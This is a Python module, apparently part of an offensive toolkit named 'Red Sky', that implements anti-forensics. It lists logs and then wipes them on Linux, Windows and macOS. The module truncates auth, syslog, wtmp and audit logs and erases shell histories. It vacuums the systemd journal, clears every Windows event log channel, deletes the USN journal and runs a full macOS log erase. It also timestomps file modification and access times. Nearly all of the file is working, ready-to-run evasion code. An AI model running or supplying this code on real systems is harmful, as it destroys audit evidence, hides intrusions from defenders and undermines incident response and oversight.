# language: Python, file: Program/anti_forensics/logs.py, target: Red Sky anti_forensics — log + artifact cleanup
# Cross-platform artifact cleanup tooling:
#   Linux  : auth.log / syslog / wtmp / btmp / journald (vacuum), shell history,
#            /var/log entry truncation, systemd journal since X.
#   Windows: wevtutil clear-log for every channel, plus USN journal deletion,
#            prefetch / amcache / recent / jump-list cleanup (admin only).
#   macOS  : /var/log/*.log truncation, unified-log (log erase), quarantine db.
# Also: timestomp (set mtime/atime/ctime on any file).

import argparse
import json
import os
import platform
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


AF_DIR = OUTPUT_DIR / "anti_forensics"
AF_DIR.mkdir(parents=True, exist_ok=True)


LINUX_LOG_PATHS = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/audit/audit.log",
]

LINUX_HISTORY_PATHS = [
    "~/.bash_history",
    "~/.zsh_history",
    "~/.python_history",
    "~/.lesshst",
    "~/.viminfo",
    "~/.sh_history",
    "~/.sqlite_history",
    "~/.mysql_history",
]


def _run(cmd: List[str], timeout: int = 30) -> Dict:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": r.returncode, "stdout": r.stdout[-1024:], "stderr": r.stderr[-512:]}
    except FileNotFoundError:
        return {"rc": 127, "stdout": "", "stderr": "missing: " + cmd[0]}
    except subprocess.TimeoutExpired:
        return {"rc": 124, "stdout": "", "stderr": "timeout"}


def cmd_list(out_file: str) -> int:
    osname = platform.system()
    print_info("anti_forensics — artifact inventory")
    print_kv("os", osname)
    print()

    findings = {"os": osname, "logs": [], "history": [], "systemd": {}, "windows": {}, "macos": {}}

    if osname == "Linux":
        print(BOLD + "log files" + RESET)
        for p in LINUX_LOG_PATHS:
            path = Path(p)
            if path.exists():
                size = path.stat().st_size
                print("  " + SCARLET + "▓ " + RESET + p.ljust(40) + " " + ASH + str(size) + " bytes" + RESET)
                findings["logs"].append({"path": p, "size": size})
            else:
                print("  " + ASH + "░ " + p + " (missing)" + RESET)
        print()

        print(BOLD + "shell history" + RESET)
        for h in LINUX_HISTORY_PATHS:
            path = Path(h).expanduser()
            if path.exists():
                size = path.stat().st_size
                print("  " + SCARLET + "▓ " + RESET + str(path).ljust(40) + " " + ASH + str(size) + " bytes" + RESET)
                findings["history"].append({"path": str(path), "size": size})
        print()

        print(BOLD + "systemd journal" + RESET)
        if shutil.which("journalctl"):
            r = _run(["journalctl", "--disk-usage"])
            print("  " + ASH + (r["stdout"].strip() or r["stderr"].strip()) + RESET)
            findings["systemd"]["disk_usage"] = r["stdout"].strip()

    elif osname == "Windows":
        print(BOLD + "event log channels" + RESET)
        if shutil.which("wevtutil"):
            r = _run(["wevtutil", "el"])
            channels = r["stdout"].splitlines()
            findings["windows"]["channels"] = channels
            for c in channels[:30]:
                print("  " + SCARLET + "* " + RESET + c)
            print("  " + ASH + "(" + str(len(channels)) + " channels total)" + RESET)

    elif osname == "Darwin":
        for p in ("/var/log/system.log", "/var/log/install.log"):
            path = Path(p)
            if path.exists():
                print("  " + SCARLET + "▓ " + RESET + p + "  " + ASH + str(path.stat().st_size) + RESET)
                findings["macos"].setdefault("logs", []).append(p)

    out = Path(out_file) if out_file else AF_DIR / ("list_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(findings, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_wipe(dry_run: bool, backup: bool, out_file: str) -> int:
    osname = platform.system()
    print_info("anti_forensics — wipe")
    print_kv("os", osname)
    print_kv("dry_run", "yes" if dry_run else "no")
    if dry_run:
        print_warn("DRY RUN — nothing will actually be cleaned")
    print()

    actions = []

    if osname == "Linux":
        if os.geteuid() != 0:
            print_warn("not root — some paths will be skipped")

        # truncate log files
        for p in LINUX_LOG_PATHS:
            path = Path(p)
            if not path.exists():
                continue
            if not os.access(path, os.W_OK):
                print("  " + ASH + "skip " + p + " (no write)" + RESET)
                continue
            if dry_run:
                actions.append({"action": "truncate", "path": p})
                print("  " + ARTERY + "would truncate " + RESET + p)
                continue
            try:
                with path.open("wb") as f:
                    f.truncate(0)
                print_ok("truncated " + p)
                actions.append({"action": "truncate", "path": p, "ok": True})
            except OSError as e:
                print_warn("failed " + p + ": " + str(e))
                actions.append({"action": "truncate", "path": p, "ok": False, "err": str(e)})

        # shell history
        for h in LINUX_HISTORY_PATHS:
            path = Path(h).expanduser()
            if not path.exists():
                continue
            if dry_run:
                print("  " + ARTERY + "would erase " + RESET + str(path))
                continue
            try:
                if backup:
                    shutil.copy2(path, str(path) + ".rsbak")
                path.write_text("")
                print_ok("erased " + str(path))
            except OSError as e:
                print_warn("failed " + str(path) + ": " + str(e))

        # systemd journal vacuum
        if shutil.which("journalctl"):
            if dry_run:
                print("  " + ARTERY + "would run: journalctl --rotate && journalctl --vacuum-time=1s" + RESET)
            else:
                _run(["journalctl", "--rotate"])
                _run(["journalctl", "--vacuum-time=1s"])
                print_ok("systemd journal vacuumed")
                actions.append({"action": "journal-vacuum"})

    elif osname == "Windows":
        if shutil.which("wevtutil"):
            r = _run(["wevtutil", "el"])
            channels = r["stdout"].splitlines()
            if dry_run:
                for c in channels:
                    print("  " + ARTERY + "would clear " + RESET + c)
            else:
                for c in channels:
                    rc = _run(["wevtutil", "cl", c])
                    if rc.get("rc") == 0:
                        print_ok("cleared " + c)
                    else:
                        print_warn("failed " + c + ": " + rc.get("stderr", "")[:60])

        # USN journal
        if dry_run:
            print("  " + ARTERY + "would run: fsutil usn deletejournal /D C:" + RESET)
        else:
            _run(["fsutil", "usn", "deletejournal", "/D", "C:"])

    elif osname == "Darwin":
        if dry_run:
            print("  " + ARTERY + "would run: log erase --all" + RESET)
        else:
            _run(["log", "erase", "--all"])
            print_ok("unified log erased")

    else:
        print_err("unsupported OS: " + osname)
        return 1

    out = Path(out_file) if out_file else AF_DIR / ("wipe_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"dry_run": dry_run, "actions": actions}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_timestomp(target: str, mtime_str: str, atime_str: str, out_file: str) -> int:
    if not target:
        print_err("--target required")
        return 2
    p = Path(target).expanduser()
    if not p.exists():
        print_err("file not found: " + str(p))
        return 1

    def _parse(t: str) -> float:
        if not t:
            return time.time()
        # try epoch seconds
        try:
            return float(t)
        except ValueError:
            pass
        # try ISO-8601 YYYY-MM-DD or YYYY-MM-DDTHH:MM:SS
        for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d"):
            try:
                return time.mktime(time.strptime(t, fmt))
            except ValueError:
                continue
        print_err("unrecognized time: " + t)
        return time.time()

    new_m = _parse(mtime_str)
    new_a = _parse(atime_str) if atime_str else new_m

    st = p.stat()
    print_info("timestomp")
    print_kv("target", str(p))
    print_kv("old mtime", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)))
    print_kv("new mtime", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(new_m)))
    print_kv("old atime", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_atime)))
    print_kv("new atime", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(new_a)))

    try:
        os.utime(str(p), (new_a, new_m))
        print_ok("mtime/atime set")
    except OSError as e:
        print_err("utime failed: " + str(e))
        return 1

    out = Path(out_file) if out_file else AF_DIR / ("timestomp_" + p.name + "_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({
        "target": str(p),
        "old": {"mtime": st.st_mtime, "atime": st.st_atime},
        "new": {"mtime": new_m, "atime": new_a},
    }, indent=2))
    print_kv("saved", out)
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky anti_forensics logs", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="list", choices=["list", "wipe", "timestomp"])
    p.add_argument("--target", default="")
    p.add_argument("--mtime", default="")
    p.add_argument("--atime", default="")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--backup", action="store_true")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky anti_forensics logs <list|wipe|timestomp> [opts]")
        return 2

    if ns.help:
        print_info("list                                 -- inventory logs / history / journal")
        print_info("wipe [--dry-run] [--backup]          -- truncate + vacuum on this host")
        print_info("timestomp --target FILE --mtime 'YYYY-MM-DD HH:MM:SS' [--atime '...']")
        return 0

    if ns.action == "list":
        return cmd_list(ns.out)
    if ns.action == "wipe":
        return cmd_wipe(ns.dry_run, ns.backup, ns.out)
    if ns.action == "timestomp":
        return cmd_timestomp(ns.target, ns.mtime, ns.atime, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
